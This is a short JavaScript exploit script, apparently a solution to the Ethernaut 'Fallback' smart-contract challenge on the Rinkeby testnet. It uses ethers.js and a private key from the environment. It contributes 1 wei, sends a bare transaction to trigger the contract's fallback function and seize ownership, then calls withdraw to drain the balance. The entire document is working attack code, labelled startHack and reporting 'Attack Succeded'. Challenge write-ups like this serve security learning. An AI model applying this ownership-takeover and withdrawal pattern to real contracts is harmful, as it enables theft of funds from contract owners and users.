const { ethers } = require('ethers')
const ABI = require('../abi/1_fallback.json')
require('dotenv').config()

const provider = new ethers.providers.InfuraProvider("rinkeby")
const Wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider)

// replace it with your contract address
const ContractAddress = "0x35DDaF6eC78626A7C5D9B818a9A8BdB473D8D7A7"

const fallback = new ethers.Contract(
    ContractAddress,
    ABI,
    Wallet
)

const startHack = async() => {
    try{
        const tx = {to: ContractAddress, value:1}
        const gasPrice = await Wallet.getGasPrice()
        await fallback.contribute({value: 1})
        await Wallet.sendTransaction({
            ...tx,
            gasPrice,
            gasLimit: ethers.utils.hexlify(100000), //100 gwei
        })
        await fallback.withdraw()
        const newOwner = await fallback.owner()
        console.log("Attack Succeded: ", newOwner)
    }catch(e){
        console.log(e)
    }
}

startHack()